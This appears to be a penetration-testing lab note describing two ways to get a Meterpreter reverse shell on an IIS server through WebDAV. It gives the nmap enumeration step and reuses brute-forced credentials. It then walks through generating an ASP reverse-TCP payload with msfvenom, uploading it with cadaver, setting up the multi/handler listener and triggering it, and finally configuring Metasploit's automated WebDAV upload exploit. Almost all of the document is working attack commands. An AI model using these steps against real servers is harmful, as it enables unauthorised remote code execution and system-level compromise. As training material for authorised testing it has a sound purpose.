# Getting Meterpreter via WebDAV â€“ Two Techniques

## ğŸ” Background

- `nmap -sV -p 80 --script=http-enum <IP>`  
  â†’ Uses NSE script to **enumerate common web paths** (e.g., `/webdav/`, `/admin/`)  
  â†’ Output: `/webdav/ â€” potentially interesting folder` = likely WebDAV enabled

- After **Hydra brute-force**, you have valid creds (e.g., `bob:password_1234`)

---
## ğŸ› ï¸ Technique 1: Manual Payload + Upload

### Step 1: Generate ASP Payload with `msfvenom`

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=1234 -f asp > shell.asp
```

> â“ **How to know the payload?**  
> - Run `msfconsole` â†’ `use exploit/multi/handler` â†’ `show payloads`  
> - Or: `msfvenom --list payloads | grep windows/meterpreter`

> ğŸ’¡ **Arch (x86 vs x64)?**  
> - Use `windows/x64/meterpreter/reverse_tcp` for 64-bit  
> - But **x86 works on both** (Windows runs 32-bit apps on 64-bit) â†’ safer default

### Step 2: Upload via `cadaver`

```bash
cadaver http://192.168.1.10/webdav/
# Enter creds when prompted
dav:> put shell.asp
dav:> ls          # Confirm upload
dav:> help        # See commands (e.g., delete after)
```

### Step 3: Start Listener in Metasploit

```msf
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 1234
run
```

> â“ **What is `multi/handler`?**  
> â†’ Itâ€™s a **listener module** that waits for reverse connections and delivers the Meterpreter stage.

### Step 4: Trigger Payload

Visit in browser:  
`http://192.168.1.10/webdav/shell.asp`

âœ… Meterpreter session opens â†’ `sysinfo`, `getuid`, etc.

---
## âš¡ Technique 2: Automated MSF Module

### Use Built-in Exploit

```msf
search iis_webdav_upload_asp
use exploit/windows/iis/iis_webdav_upload_asp
```

### Configure & Run

```msf
set RHOSTS 192.168.1.10
set HttpUsername bob
set HttpPassword password_1234
set PATH /webdav/msf_shell.asp   # Auto-generated name
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444
exploit
```

âœ… MSF **auto**:
- Generates payload  
- Uploads it  
- Executes it  
- Deletes it  
- Gives you Meterpreter

> ğŸ’¡ To use **64-bit**:  
> ```msf
> set PAYLOAD windows/x64/meterpreter/reverse_tcp
> ```

---
## Key Notes
- **Manual method**: Full control, reusable payload  
- **Auto module**: Faster, cleaner (no leftover files)  
- Always **match payload + listener** (`LHOST`/`LPORT`)  
- WebDAV must allow **ASP execution** (IIS only)

> ğŸ”¥ Both methods give **full SYSTEM-level access** if IIS runs as high-priv user.

